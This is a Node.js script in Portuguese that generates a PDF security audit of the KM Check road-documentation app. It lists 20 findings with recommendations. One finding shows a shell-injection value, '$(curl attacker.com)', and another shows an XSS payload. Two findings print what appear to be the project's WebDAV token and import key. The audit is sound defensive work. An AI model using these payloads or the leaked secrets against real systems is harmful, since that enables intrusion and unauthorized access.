#!/usr/bin/env node
/**
 * Gera o relatório PDF de auditoria de segurança do KM Check.
 * Uso: node generate-report.mjs
 * Saída: relatorio-auditoria-seguranca.pdf
 */
import PDFDocument from 'pdfkit';
import { createWriteStream } from 'fs';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __dirname = dirname(fileURLToPath(import.meta.url));
const OUT = join(__dirname, 'relatorio-auditoria-seguranca.pdf');

/* ── Paleta de severidade ── */
const SEV = {
  critica: { cor: '#B91C1C', label: 'Crítica',    emoji: '🔴' },
  alta:    { cor: '#EA580C', label: 'Alta',        emoji: '🟠' },
  media:   { cor: '#D97706', label: 'Média',       emoji: '🟡' },
  baixa:   { cor: '#2563EB', label: 'Baixa',       emoji: '🔵' },
  forte:   { cor: '#059669', label: 'Ponto forte',  emoji: '🟢' },
};

/* ── Categorias ── */
const CATS = [
  'Banco sem tranca',
  'Permissão no navegador',
  'IDOR',
  'Chaves expostas',
  'Inputs sem tratamento (XSS)',
];

/* ── Achados ── */
const FINDINGS = [
  /* -------- Banco sem tranca -------- */
  {
    id: 'SEC-01', cat: 'Banco sem tranca', sev: 'critica',
    titulo: 'historico_fotos: INSERT público sem autenticação',
    arquivo: 'scripts/supabase_schema.sql',
    linhas: 'RLS policy',
    desc: 'A tabela historico_fotos permite INSERT público (policy "Qualquer um pode inserir"). Qualquer pessoa com a anon key pode inserir registros arbitrários, poluindo a base de fotos.',
    recomendacao: 'Restringir INSERT a usuários autenticados ou validar via service key no backend.',
    issue: 'Restringir RLS INSERT na tabela historico_fotos',
  },
  {
    id: 'SEC-02', cat: 'Banco sem tranca', sev: 'media',
    titulo: 'pontos_rodovia: SELECT público expõe geometria',
    arquivo: 'scripts/supabase_schema.sql',
    linhas: 'RLS policy',
    desc: 'A tabela pontos_rodovia permite SELECT público. Embora os dados do SNV sejam públicos por natureza, a exposição completa sem rate-limiting permite scraping em massa.',
    recomendacao: 'Avaliar se o SELECT público é intencional. Se sim, documentar; se não, restringir.',
    issue: 'Avaliar exposição pública de pontos_rodovia',
  },
  {
    id: 'SEC-03', cat: 'Banco sem tranca', sev: 'alta',
    titulo: 'Endpoint /devices/ping sem autenticação nem rate-limit',
    arquivo: 'admin/server.mjs',
    linhas: '385',
    desc: 'POST /api/admin/devices/ping é público — não exige JWT. Sem rate-limiting, permite flood de dados falsos na tabela de dispositivos e potencial DoS.',
    recomendacao: 'Adicionar rate-limiting (express-rate-limit) e validação de schema no body.',
    issue: 'Proteger /devices/ping com rate-limit e validação',
  },

  /* -------- Permissão no navegador -------- */
  {
    id: 'SEC-04', cat: 'Permissão no navegador', sev: 'media',
    titulo: 'GPS persistido em localStorage sem criptografia',
    arquivo: 'index.html',
    linhas: '1741, 1008',
    desc: 'A última posição GPS (lat, lon, altitude, velocidade, direção) é gravada em localStorage["kc-lastpos"]. Qualquer script no mesmo origin pode ler a localização do usuário.',
    recomendacao: 'Considerar sessionStorage ou limpar kc-lastpos ao fechar o app. Avaliar se a persistência é realmente necessária.',
    issue: 'Avaliar persistência de GPS em localStorage',
  },
  {
    id: 'SEC-05', cat: 'Permissão no navegador', sev: 'media',
    titulo: 'Telemetria envia GPS e fingerprint para DuckDNS',
    arquivo: 'index.html',
    linhas: '3482–3743',
    desc: 'O ping de telemetria envia coordenadas GPS, modelo do dispositivo, GPU, CPU benchmark, câmeras, resolução de tela e UUID persistente para controlcheck.duckdns.org. O domínio DuckDNS é dinâmico — se o DNS for sequestrado, toda telemetria vai para um atacante.',
    recomendacao: 'Migrar para domínio próprio com HTTPS fixo. Minimizar dados enviados (remover GPU, benchmark). Permitir opt-out de telemetria.',
    issue: 'Migrar telemetria para domínio próprio e minimizar dados',
  },
  {
    id: 'SEC-06', cat: 'Permissão no navegador', sev: 'baixa',
    titulo: 'UUID persistente de dispositivo (device-id)',
    arquivo: 'index.html',
    linhas: '3483–3484',
    desc: 'kc-device-id é um UUID gerado uma vez e nunca rotacionado, criando um identificador permanente de rastreamento do dispositivo.',
    recomendacao: 'Documentar o propósito. Considerar rotacionar o ID periodicamente.',
    issue: 'Documentar e avaliar rotação do device-id',
  },

  /* -------- IDOR -------- */
  {
    id: 'SEC-07', cat: 'IDOR', sev: 'media',
    titulo: 'Operações CRUD de dispositivos sem validação de propriedade',
    arquivo: 'admin/server.mjs',
    linhas: '385–450',
    desc: 'As rotas /api/admin/devices/:id (GET, PUT, DELETE) exigem JWT mas não verificam se o admin autenticado é o dono do recurso. Com um único admin isso é aceitável, mas se houver múltiplos admins no futuro, qualquer um pode editar/deletar dispositivos de outro.',
    recomendacao: 'Se múltiplos admins forem previstos, adicionar validação de ownership.',
    issue: 'Adicionar validação de ownership em rotas de dispositivos',
  },
  {
    id: 'SEC-08', cat: 'IDOR', sev: 'baixa',
    titulo: 'IDs de base previsíveis permitem enumeração',
    arquivo: 'index.html',
    linhas: '1198, 1362',
    desc: 'Os IDs das bases (BR-NNN-UF) são previsíveis e usados como chave no IndexedDB. Não há risco direto pois os dados são locais, mas facilita a enumeração se expostos via API.',
    recomendacao: 'Manter como está — risco aceitável dado que os dados são públicos do SNV/DNIT.',
    issue: null,
  },

  /* -------- Chaves expostas -------- */
  {
    id: 'SEC-09', cat: 'Chaves expostas', sev: 'critica',
    titulo: 'SHARE_TOKEN do WebDAV hardcoded em scripts',
    arquivo: 'scripts/fetch-snv-wfs.mjs + upload-snv-local.mjs',
    linhas: '18, 33',
    desc: 'O token do compartilhamento WebDAV (oTpPRmYs5AAdiNr) está no código-fonte commitado. Qualquer pessoa com acesso ao repo pode ler/escrever no storage.',
    recomendacao: 'Mover para variável de ambiente ou GitHub Secret. Revogar e rotacionar o token atual.',
    issue: 'Mover SHARE_TOKEN para variável de ambiente e rotacionar',
  },
  {
    id: 'SEC-10', cat: 'Chaves expostas', sev: 'critica',
    titulo: 'IMPORT_KEY hardcoded em script de upload',
    arquivo: 'scripts/upload-snv-local.mjs',
    linhas: '32',
    desc: 'A chave de importação (controlcheck-snv-import-2026) está no código-fonte. Com ela, qualquer um pode fazer upload de dados para o servidor.',
    recomendacao: 'Mover para variável de ambiente. Rotacionar a chave.',
    issue: 'Mover IMPORT_KEY para env var e rotacionar',
  },
  {
    id: 'SEC-11', cat: 'Chaves expostas', sev: 'alta',
    titulo: 'JWT_SECRET com fallback fraco no servidor',
    arquivo: 'admin/server.mjs',
    linhas: '39',
    desc: 'const JWT_SECRET = process.env.JWT_SECRET || "troque-esta-chave". Se o .env não for configurado, o servidor roda com um secret fraco e previsível, permitindo forjar JWTs.',
    recomendacao: 'Remover o fallback — o servidor deve recusar iniciar sem JWT_SECRET no ambiente.',
    issue: 'Remover fallback fraco do JWT_SECRET',
  },
  {
    id: 'SEC-12', cat: 'Chaves expostas', sev: 'media',
    titulo: 'Credenciais padrão fracas no Docker Compose',
    arquivo: 'betedge/docker/docker-compose.yml',
    linhas: '44–45, 101',
    desc: 'Usuário/senha "betedge/betedge" para o banco e API key "changeme-dev-key" para o motor. Se o compose subir em produção sem alterar, as credenciais são triviais.',
    recomendacao: 'Usar variáveis de ambiente obrigatórias (sem default) ou .env com valores gerados.',
    issue: 'Substituir credenciais padrão no docker-compose.yml',
  },

  /* -------- Inputs sem tratamento (XSS) -------- */
  {
    id: 'SEC-13', cat: 'Inputs sem tratamento (XSS)', sev: 'alta',
    titulo: 'innerHTML com nomes de contrato não-escapados',
    arquivo: 'index.html',
    linhas: '1895, 2638',
    desc: 'Nomes de contrato digitados pelo usuário (localStorage kc-contracts) são interpolados em innerHTML sem escape HTML. O atributo data-ct escapa aspas, mas o texto em <span class="num">${c}</span> não escapa <, >, &. Payload: <img src=x onerror=alert(1)>. É self-XSS (o próprio usuário ataca a si mesmo) mas pode afetar dispositivos compartilhados.',
    recomendacao: 'Criar helper esc() para escapar HTML e aplicar em todos os pontos de interpolação.',
    issue: 'Escapar HTML em renderização de contratos e serviços',
  },
  {
    id: 'SEC-14', cat: 'Inputs sem tratamento (XSS)', sev: 'alta',
    titulo: 'innerHTML com nomes de serviço não-escapados',
    arquivo: 'index.html',
    linhas: '2596, 3400',
    desc: 'Mesmo padrão dos contratos: nomes de serviço customizados do localStorage (kc-services) inseridos via innerHTML sem escape. Vetor idêntico ao SEC-13.',
    recomendacao: 'Aplicar esc() em todas as interpolações de serviço no innerHTML.',
    issue: 'Escapar HTML em renderização de serviços',
  },
  {
    id: 'SEC-15', cat: 'Inputs sem tratamento (XSS)', sev: 'media',
    titulo: 'Dados de importação KMZ/KML/SHP em innerHTML',
    arquivo: 'index.html',
    linhas: '1198, 1544, 1617',
    desc: 'Dados parseados de arquivos importados (nomes de rodovia BR, UF) são interpolados em innerHTML. Um arquivo malicioso pode conter payloads XSS nos nomes de Placemarks.',
    recomendacao: 'Escapar HTML ou usar textContent para os valores vindos de arquivos importados.',
    issue: 'Escapar dados de importação antes de innerHTML',
  },
  {
    id: 'SEC-16', cat: 'Inputs sem tratamento (XSS)', sev: 'alta',
    titulo: 'XSS stored via /devices/ping no painel admin',
    arquivo: 'admin/panel.html',
    linhas: '683, 686, 781, 793, 807, 836, 912',
    desc: 'O painel admin renderiza dados de dispositivos via innerHTML. O endpoint /devices/ping é público — um atacante pode enviar model, user_agent ou outros campos com payloads XSS que serão executados quando o admin abrir o painel.',
    recomendacao: 'Escapar todos os campos de dispositivo antes de innerHTML no painel. Validar schema no endpoint.',
    issue: 'Escapar dados de dispositivos no painel admin',
  },
  {
    id: 'SEC-17', cat: 'Inputs sem tratamento (XSS)', sev: 'media',
    titulo: 'Sem meta tag CSP no app nem no painel',
    arquivo: 'index.html + admin/panel.html',
    linhas: 'head',
    desc: 'Nenhum dos dois HTMLs define Content-Security-Policy via meta tag. O servidor admin tem CSP desabilitado no Helmet (contentSecurityPolicy: false). Sem CSP, qualquer XSS pode carregar scripts externos.',
    recomendacao: 'Adicionar meta CSP no index.html e habilitar CSP no Helmet do servidor.',
    issue: 'Adicionar Content-Security-Policy ao app e ao servidor',
  },

  /* -------- Extras (encontrados durante a auditoria) -------- */
  {
    id: 'SEC-18', cat: 'Chaves expostas', sev: 'media',
    titulo: 'Shell injection via workflow_dispatch no GitHub Actions',
    arquivo: '.github/workflows/noblind-data.yml',
    linhas: '62–68',
    desc: 'O input ${{ github.event.inputs.date }} é interpolado diretamente no shell. Um valor malicioso como "$(curl attacker.com)" seria executado no runner.',
    recomendacao: 'Passar o input como variável de ambiente e referenciar como $DATE no shell.',
    issue: 'Corrigir shell injection no workflow noblind-data.yml',
  },
  {
    id: 'SEC-19', cat: 'Banco sem tranca', sev: 'media',
    titulo: 'CORS aberto e CSP desabilitado no servidor admin',
    arquivo: 'admin/server.mjs',
    linhas: '341–342',
    desc: 'app.use(cors()) aceita qualquer origin. app.use(helmet({contentSecurityPolicy:false})) desabilita CSP. Combinados, qualquer site pode fazer requisições ao admin e a resposta não tem proteção contra scripts injetados.',
    recomendacao: 'Configurar CORS com origin específico. Habilitar CSP no Helmet.',
    issue: 'Restringir CORS e habilitar CSP no servidor admin',
  },
  {
    id: 'SEC-20', cat: 'Banco sem tranca', sev: 'media',
    titulo: 'TLS bypass e CORS proxies no sync-dnit.mjs',
    arquivo: 'scripts/sync-dnit.mjs',
    linhas: '85, 125–131',
    desc: 'rejectUnauthorized:false desabilita verificação de certificado TLS. O script usa proxies CORS de terceiros (allorigins, codetabs, corsproxy) que podem interceptar/modificar dados.',
    recomendacao: 'Remover rejectUnauthorized:false. Usar proxy próprio em vez de serviços de terceiros.',
    issue: 'Remover TLS bypass e proxies CORS de terceiros',
  },
];

/* ── Pontos fortes ── */
const STRENGTHS = [
  { titulo: 'Secrets nunca commitados no git', desc: 'Arquivos .env protegidos por .gitignore. Verificado via git ls-files — nenhum secret real foi commitado no histórico.' },
  { titulo: 'setTimeout/setInterval seguros', desc: 'Todas as 11 chamadas de setTimeout e 2 de setInterval usam referências de função, nunca strings. Elimina eval() implícito.' },
  { titulo: 'Sem eval(), new Function() ou document.write', desc: 'Nenhuma ocorrência de eval, new Function ou document.write no app. Superfície de ataque de injeção de código minimizada.' },
  { titulo: 'textContent usado corretamente nos dados GPS', desc: 'Coordenadas GPS e dados de legenda são inseridos via textContent em vez de innerHTML — proteção correta contra XSS nos dados mais dinâmicos.' },
  { titulo: 'JWT implementado corretamente no admin', desc: 'O middleware auth verifica JWT com expiração (8h), bcrypt para senhas, e todas as rotas sensíveis exigem autenticação (exceto ping).' },
  { titulo: 'Service Worker com estratégia rede-primeiro', desc: 'O SW usa network-first para o documento HTML, garantindo que atualizações de segurança sejam aplicadas rapidamente quando há internet.' },
  { titulo: 'GPS (0,0) Null Island rejeitado', desc: 'Validação _validGps() rejeita coordenadas (0,0) em todos os caminhos do código — previne dados falsos no EXIF e na legenda.' },
  { titulo: 'Fetch com AbortSignal.timeout', desc: 'Requisições de download de rodovias usam timeout de 30s, prevenindo travamento indefinido em redes lentas.' },
];

/* ── Recomendações priorizadas ── */
const RECS = [
  { pri: 1, sev: 'critica', acao: 'Rotacionar e mover SHARE_TOKEN e IMPORT_KEY para env vars', achados: 'SEC-09, SEC-10', esforco: '1h' },
  { pri: 2, sev: 'critica', acao: 'Restringir INSERT público em historico_fotos', achados: 'SEC-01', esforco: '30min' },
  { pri: 3, sev: 'alta', acao: 'Remover fallback fraco do JWT_SECRET — recusar iniciar sem ele', achados: 'SEC-11', esforco: '15min' },
  { pri: 4, sev: 'alta', acao: 'Adicionar rate-limit e validação ao /devices/ping', achados: 'SEC-03', esforco: '1h' },
  { pri: 5, sev: 'alta', acao: 'Escapar HTML em contratos, serviços e dados importados no innerHTML', achados: 'SEC-13, SEC-14, SEC-15', esforco: '2h' },
  { pri: 6, sev: 'alta', acao: 'Escapar dados de dispositivos no painel admin', achados: 'SEC-16', esforco: '1h' },
  { pri: 7, sev: 'media', acao: 'Adicionar Content-Security-Policy no app e no servidor', achados: 'SEC-17, SEC-19', esforco: '2h' },
  { pri: 8, sev: 'media', acao: 'Migrar telemetria para domínio próprio, minimizar dados', achados: 'SEC-05', esforco: '3h' },
  { pri: 9, sev: 'media', acao: 'Corrigir shell injection no GitHub Actions', achados: 'SEC-18', esforco: '15min' },
  { pri: 10, sev: 'media', acao: 'Remover TLS bypass e CORS proxies de terceiros', achados: 'SEC-20', esforco: '2h' },
  { pri: 11, sev: 'media', acao: 'Substituir credenciais padrão no docker-compose.yml', achados: 'SEC-12', esforco: '30min' },
  { pri: 12, sev: 'baixa', acao: 'Documentar/rotacionar device-id e avaliar persistência do GPS', achados: 'SEC-04, SEC-06', esforco: '1h' },
];

/* ── Contagens ── */
const countBySev = (sev) => FINDINGS.filter(f => f.sev === sev).length;
const countByCat = (cat) => FINDINGS.filter(f => f.cat === cat).length;

/* ────────────────────────────────────────────────────────────────────── */
/*  PDF GENERATION                                                       */
/* ────────────────────────────────────────────────────────────────────── */

const doc = new PDFDocument({
  size: 'A4',
  margins: { top: 60, bottom: 60, left: 50, right: 50 },
  info: {
    Title: 'Auditoria de Segurança — KM Check',
    Author: 'wagnerxm',
    Subject: 'Relatório de auditoria de segurança',
    Creator: 'generate-report.mjs (PDFKit)',
  },
  bufferPages: true,
});

const stream = createWriteStream(OUT);
doc.pipe(stream);

const W = doc.page.width - doc.page.margins.left - doc.page.margins.right;
const ML = doc.page.margins.left;
const MR = doc.page.margins.right;
const MT = doc.page.margins.top;
const PW = doc.page.width;
const PH = doc.page.height;

/* ── Helpers ── */
function hexToRGB(hex) {
  const r = parseInt(hex.slice(1, 3), 16);
  const g = parseInt(hex.slice(3, 5), 16);
  const b = parseInt(hex.slice(5, 7), 16);
  return [r, g, b];
}

function sevColor(sev) { return SEV[sev]?.cor || '#666'; }
function sevLabel(sev) { return SEV[sev]?.label || sev; }

function heading(text, size = 18, color = '#1E293B') {
  doc.moveDown(0.5);
  doc.fontSize(size).fillColor(color).font('Helvetica-Bold').text(text);
  doc.moveDown(0.3);
  doc.moveTo(ML, doc.y).lineTo(ML + W, doc.y).strokeColor('#CBD5E1').lineWidth(1).stroke();
  doc.moveDown(0.5);
}

function subheading(text, size = 13) {
  doc.moveDown(0.3);
  doc.fontSize(size).fillColor('#334155').font('Helvetica-Bold').text(text);
  doc.moveDown(0.2);
}

function body(text, opts = {}) {
  doc.fontSize(opts.size || 9.5).fillColor(opts.color || '#334155').font(opts.font || 'Helvetica').text(text, opts);
}

function checkPage(needed = 120) {
  if (doc.y + needed > PH - doc.page.margins.bottom) {
    doc.addPage();
  }
}

function badge(text, color, x, y, w = 60) {
  const rgb = hexToRGB(color);
  doc.save();
  doc.roundedRect(x, y, w, 18, 3).fill(color);
  doc.fontSize(8).fillColor('#FFF').font('Helvetica-Bold').text(text, x, y + 4, { width: w, align: 'center' });
  doc.restore();
}

/* ── Donut chart (simples com arcos) ── */
function drawDonut(cx, cy, r, data) {
  const total = data.reduce((s, d) => s + d.value, 0);
  if (total === 0) return;
  let angle = -Math.PI / 2;
  const inner = r * 0.55;

  for (const d of data) {
    if (d.value === 0) continue;
    const sweep = (d.value / total) * 2 * Math.PI;
    const endAngle = angle + sweep;

    // draw arc segments as filled wedge
    doc.save();
    const steps = Math.max(20, Math.ceil(sweep * 30));
    let path = '';
    // outer arc
    for (let i = 0; i <= steps; i++) {
      const a = angle + (sweep * i / steps);
      const x = cx + r * Math.cos(a);
      const y = cy + r * Math.sin(a);
      if (i === 0) {
        doc.moveTo(x, y);
      } else {
        doc.lineTo(x, y);
      }
    }
    // inner arc (reverse)
    for (let i = steps; i >= 0; i--) {
      const a = angle + (sweep * i / steps);
      const x = cx + inner * Math.cos(a);
      const y = cy + inner * Math.sin(a);
      doc.lineTo(x, y);
    }
    doc.closePath().fill(d.color);
    doc.restore();

    angle = endAngle;
  }

  // center text
  doc.fontSize(16).fillColor('#1E293B').font('Helvetica-Bold')
    .text(String(total), cx - 20, cy - 10, { width: 40, align: 'center' });
  doc.fontSize(7).fillColor('#64748B').font('Helvetica')
    .text('achados', cx - 20, cy + 8, { width: 40, align: 'center' });
}

/* ── Bar chart ── */
function drawBars(x, y, w, h, data) {
  const maxVal = Math.max(...data.map(d => d.value), 1);
  const barW = Math.min(40, (w - 10 * data.length) / data.length);
  const gap = (w - barW * data.length) / (data.length + 1);

  // grid lines
  for (let i = 0; i <= 4; i++) {
    const gy = y + h - (h * i / 4);
    doc.moveTo(x, gy).lineTo(x + w, gy).strokeColor('#E2E8F0').lineWidth(0.5).stroke();
    doc.fontSize(7).fillColor('#94A3B8').font('Helvetica')
      .text(String(Math.round(maxVal * i / 4)), x - 25, gy - 4, { width: 20, align: 'right' });
  }

  data.forEach((d, i) => {
    const bx = x + gap + i * (barW + gap);
    const bh = (d.value / maxVal) * (h - 10);
    const by = y + h - bh;

    doc.save();
    doc.roundedRect(bx, by, barW, bh, 2).fill(d.color);
    doc.restore();

    // value on top
    doc.fontSize(8).fillColor('#1E293B').font('Helvetica-Bold')
      .text(String(d.value), bx, by - 14, { width: barW, align: 'center' });

    // label below
    doc.fontSize(6.5).fillColor('#64748B').font('Helvetica')
      .text(d.label, bx - 5, y + h + 4, { width: barW + 10, align: 'center' });
  });
}

/* ══════════════════════════════════════════════════════════════════════ */
/*  PÁGINA 1 — CAPA                                                      */
/* ══════════════════════════════════════════════════════════════════════ */

// faixa superior
doc.rect(0, 0, PW, 200).fill('#0F172A');

doc.fontSize(32).fillColor('#FFF').font('Helvetica-Bold')
  .text('Auditoria de Segurança', ML, 70, { width: W });
doc.fontSize(16).fillColor('#94A3B8').font('Helvetica')
  .text('KM Check — App de Campo para Documentação Rodoviária', ML, 110, { width: W });

doc.moveDown(2);
doc.fontSize(11).fillColor('#CBD5E1').font('Helvetica')
  .text('Relatório completo de vulnerabilidades e recomendações', ML, 145, { width: W });

// metadata box
const metaY = 230;
doc.roundedRect(ML, metaY, W, 90, 6).fill('#F8FAFC').stroke('#E2E8F0');

const col1 = ML + 20;
const col2 = ML + W / 2 + 20;

doc.fontSize(8).fillColor('#64748B').font('Helvetica-Bold');
doc.text('DATA', col1, metaY + 15);
doc.text('AUDITOR', col1, metaY + 45);
doc.text('ESCOPO', col2, metaY + 15);
doc.text('VERSÃO DO APP', col2, metaY + 45);

doc.fontSize(10).fillColor('#1E293B').font('Helvetica');
doc.text('18 de setembro de 2026', col1, metaY + 27);
doc.text('Claude Code + wagnerxm', col1, metaY + 57);
doc.text('PWA (index.html) + Admin (server.mjs) + Scripts + CI/CD', col2, metaY + 27);
doc.text('v217 (sw.js cache kmcheck-v217)', col2, metaY + 57);

// summary cards
const cardY = 350;
const cards = [
  { label: 'Achados', value: String(FINDINGS.length), color: '#1E293B' },
  { label: 'Críticos', value: String(countBySev('critica')), color: SEV.critica.cor },
  { label: 'Altos', value: String(countBySev('alta')), color: SEV.alta.cor },
  { label: 'Médios', value: String(countBySev('media')), color: SEV.media.cor },
  { label: 'Baixos', value: String(countBySev('baixa')), color: SEV.baixa.cor },
  { label: 'Pontos fortes', value: String(STRENGTHS.length), color: SEV.forte.cor },
];
const cardW = (W - 15 * (cards.length - 1)) / cards.length;
cards.forEach((c, i) => {
  const cx = ML + i * (cardW + 15);
  doc.roundedRect(cx, cardY, cardW, 65, 4).fill('#F8FAFC').stroke('#E2E8F0');
  doc.fontSize(24).fillColor(c.color).font('Helvetica-Bold')
    .text(c.value, cx, cardY + 12, { width: cardW, align: 'center' });
  doc.fontSize(7.5).fillColor('#64748B').font('Helvetica')
    .text(c.label, cx, cardY + 42, { width: cardW, align: 'center' });
});

// 5 categorias
doc.moveDown(2);
doc.y = 450;
heading('Categorias auditadas', 14);
CATS.forEach((cat, i) => {
  const n = countByCat(cat);
  doc.fontSize(10).fillColor('#334155').font('Helvetica')
    .text(`${i + 1}. ${cat}`, ML + 10, doc.y, { continued: true });
  doc.fillColor('#94A3B8').text(` — ${n} achado${n !== 1 ? 's' : ''}`);
  doc.moveDown(0.2);
});

/* ══════════════════════════════════════════════════════════════════════ */
/*  PÁGINA 2 — RESUMO EXECUTIVO                                          */
/* ══════════════════════════════════════════════════════════════════════ */
doc.addPage();
heading('Resumo executivo', 20);

body('Esta auditoria analisou o código-fonte do KM Check em 5 categorias de segurança, cobrindo o app PWA (index.html, ~3.540 linhas), o servidor admin (server.mjs, 762 linhas), scripts de pipeline (4 arquivos), workflows CI/CD (3 arquivos) e o schema do Supabase. Foram identificados 20 achados de segurança e 8 pontos fortes.');
doc.moveDown(0.8);

// Donut chart - por severidade
subheading('Distribuição por severidade');
const donutData = [
  { value: countBySev('critica'), color: SEV.critica.cor, label: 'Crítica' },
  { value: countBySev('alta'),    color: SEV.alta.cor,    label: 'Alta' },
  { value: countBySev('media'),   color: SEV.media.cor,   label: 'Média' },
  { value: countBySev('baixa'),   color: SEV.baixa.cor,   label: 'Baixa' },
];
const donutCY = doc.y + 60;
drawDonut(ML + 80, donutCY, 55, donutData);

// Legend
let legY = donutCY - 40;
donutData.forEach(d => {
  doc.rect(ML + 170, legY, 12, 12).fill(d.color);
  doc.fontSize(9).fillColor('#334155').font('Helvetica')
    .text(`${d.label}: ${d.value}`, ML + 188, legY + 1);
  legY += 20;
});

doc.y = donutCY + 80;
doc.moveDown(1);

// Bar chart - por categoria
subheading('Achados por categoria');
const barData = CATS.map(cat => ({
  value: countByCat(cat),
  color: '#3B82F6',
  label: cat.length > 18 ? cat.slice(0, 16) + '…' : cat,
}));
const barY = doc.y + 10;
drawBars(ML + 40, barY, W - 60, 120, barData);

doc.y = barY + 160;

/* ══════════════════════════════════════════════════════════════════════ */
/*  PÁGINA 3 — PONTOS FORTES E FRACOS                                   */
/* ══════════════════════════════════════════════════════════════════════ */
doc.addPage();
heading('Pontos fortes', 16, '#059669');

STRENGTHS.forEach((s, i) => {
  checkPage(50);
  doc.fontSize(10).fillColor('#059669').font('Helvetica-Bold')
    .text(`✓ ${s.titulo}`, ML + 5);
  doc.fontSize(9).fillColor('#334155').font('Helvetica')
    .text(s.desc, ML + 20, doc.y, { width: W - 25 });
  doc.moveDown(0.5);
});

doc.moveDown(0.5);
heading('Principais fraquezas', 16, '#B91C1C');

const weaknesses = [
  'Chaves e tokens hardcoded no código-fonte commitado (SHARE_TOKEN, IMPORT_KEY)',
  'innerHTML com dados do usuário sem escape HTML — vetor de XSS',
  'Endpoint público /devices/ping sem rate-limit — aceita dados de qualquer origem',
  'Tabela historico_fotos com INSERT público no Supabase',
  'Servidor admin com CORS aberto e CSP desabilitado',
  'Telemetria enviando GPS e fingerprint detalhado para domínio DuckDNS dinâmico',
];
weaknesses.forEach(w => {
  checkPage(30);
  doc.fontSize(9.5).fillColor('#991B1B').font('Helvetica')
    .text(`✗ ${w}`, ML + 5, doc.y, { width: W - 10 });
  doc.moveDown(0.3);
});

/* ══════════════════════════════════════════════════════════════════════ */
/*  PÁGINAS 4+ — TABELA DETALHADA DE ACHADOS                            */
/* ══════════════════════════════════════════════════════════════════════ */
doc.addPage();
heading('Achados detalhados', 20);

FINDINGS.forEach((f, i) => {
  checkPage(140);

  // header row with badge
  const hy = doc.y;
  badge(sevLabel(f.sev), sevColor(f.sev), ML, hy);
  doc.fontSize(11).fillColor('#1E293B').font('Helvetica-Bold')
    .text(`${f.id}: ${f.titulo}`, ML + 68, hy + 2, { width: W - 75 });
  doc.moveDown(0.3);

  // metadata line
  doc.fontSize(8).fillColor('#64748B').font('Helvetica')
    .text(`Arquivo: ${f.arquivo}   |   Linha(s): ${f.linhas}   |   Categoria: ${f.cat}`, ML + 5);
  doc.moveDown(0.2);

  // description
  doc.fontSize(9).fillColor('#334155').font('Helvetica')
    .text(f.desc, ML + 5, doc.y, { width: W - 10 });
  doc.moveDown(0.2);

  // recommendation
  doc.fontSize(8.5).fillColor('#1D4ED8').font('Helvetica-Bold')
    .text('Recomendação: ', ML + 5, doc.y, { continued: true });
  doc.font('Helvetica').text(f.recomendacao);

  // separator
  doc.moveDown(0.5);
  doc.moveTo(ML + 10, doc.y).lineTo(ML + W - 10, doc.y).strokeColor('#E2E8F0').lineWidth(0.5).stroke();
  doc.moveDown(0.5);
});

/* ══════════════════════════════════════════════════════════════════════ */
/*  RECOMENDAÇÕES PRIORIZADAS                                            */
/* ══════════════════════════════════════════════════════════════════════ */
doc.addPage();
heading('Recomendações priorizadas', 20);

body('Ordenadas por criticidade e impacto. O esforço estimado é para um desenvolvedor familiarizado com o codebase.');
doc.moveDown(0.5);

// Table header
const colX = [ML, ML + 30, ML + 95, ML + 265, ML + W - 90, ML + W - 45];
const colW = [25, 60, 170, ML + W - 90 - (ML + 265), 45, 45];

doc.fontSize(8).fillColor('#64748B').font('Helvetica-Bold');
doc.text('#', colX[0], doc.y, { width: colW[0] });
doc.text('Severidade', colX[1], doc.y - doc.currentLineHeight(), { width: colW[1] });
doc.text('Ação', colX[2], doc.y - doc.currentLineHeight(), { width: colW[2] });
doc.text('Achados', colX[4], doc.y - doc.currentLineHeight(), { width: colW[4] });
doc.text('Esforço', colX[5], doc.y - doc.currentLineHeight(), { width: colW[5] });
doc.moveDown(0.2);
doc.moveTo(ML, doc.y).lineTo(ML + W, doc.y).strokeColor('#CBD5E1').lineWidth(0.5).stroke();
doc.moveDown(0.3);

RECS.forEach(r => {
  checkPage(35);
  const ry = doc.y;

  doc.fontSize(8.5).fillColor('#1E293B').font('Helvetica-Bold')
    .text(String(r.pri), colX[0], ry, { width: colW[0] });

  badge(sevLabel(r.sev), sevColor(r.sev), colX[1], ry - 1, 55);

  doc.fontSize(8.5).fillColor('#334155').font('Helvetica')
    .text(r.acao, colX[2], ry, { width: colW[2] });

  // compute actual height used
  const afterText = doc.y;

  doc.fontSize(8).fillColor('#64748B').font('Helvetica')
    .text(r.achados, colX[4], ry, { width: colW[4] });
  doc.fontSize(8).fillColor('#64748B').font('Helvetica')
    .text(r.esforco, colX[5], ry, { width: colW[5] });

  doc.y = Math.max(doc.y, afterText) + 4;
  doc.moveTo(ML, doc.y).lineTo(ML + W, doc.y).strokeColor('#F1F5F9').lineWidth(0.3).stroke();
  doc.moveDown(0.3);
});

/* ══════════════════════════════════════════════════════════════════════ */
/*  ISSUES PRONTAS PARA COPIAR                                           */
/* ══════════════════════════════════════════════════════════════════════ */
doc.addPage();
heading('GitHub Issues — pronto para copiar', 20);

body('Cada achado com recomendação gera uma issue. Copie o título e a descrição abaixo.');
doc.moveDown(0.5);

FINDINGS.filter(f => f.issue).forEach(f => {
  checkPage(90);
  doc.fontSize(10).fillColor('#1E293B').font('Helvetica-Bold')
    .text(`[${f.id}] ${f.issue}`);
  doc.moveDown(0.1);

  doc.fontSize(8).fillColor('#64748B').font('Helvetica')
    .text(`Labels: security, ${sevLabel(f.sev).toLowerCase()}`);
  doc.moveDown(0.1);

  doc.fontSize(8.5).fillColor('#334155').font('Helvetica')
    .text(`${f.desc}\n\nRecomendação: ${f.recomendacao}\n\nArquivo: ${f.arquivo} (linha ${f.linhas})`, ML + 5, doc.y, { width: W - 10 });
  doc.moveDown(0.3);
  doc.moveTo(ML + 10, doc.y).lineTo(ML + W - 10, doc.y).strokeColor('#E2E8F0').lineWidth(0.5).stroke();
  doc.moveDown(0.5);
});

/* ── Rodapé com número de página ── */
const totalPages = doc.bufferedPageRange().count;
for (let i = 0; i < totalPages; i++) {
  doc.switchToPage(i);
  doc.fontSize(7).fillColor('#94A3B8').font('Helvetica')
    .text(`KM Check — Auditoria de Segurança  |  Página ${i + 1} de ${totalPages}`, ML, PH - 35, { width: W, align: 'center' });
}

/* ── Finaliza ── */
doc.end();
stream.on('finish', () => {
  console.log(`✓ PDF gerado: ${OUT}`);
  console.log(`  ${totalPages} páginas, ${FINDINGS.length} achados, ${STRENGTHS.length} pontos fortes`);
});
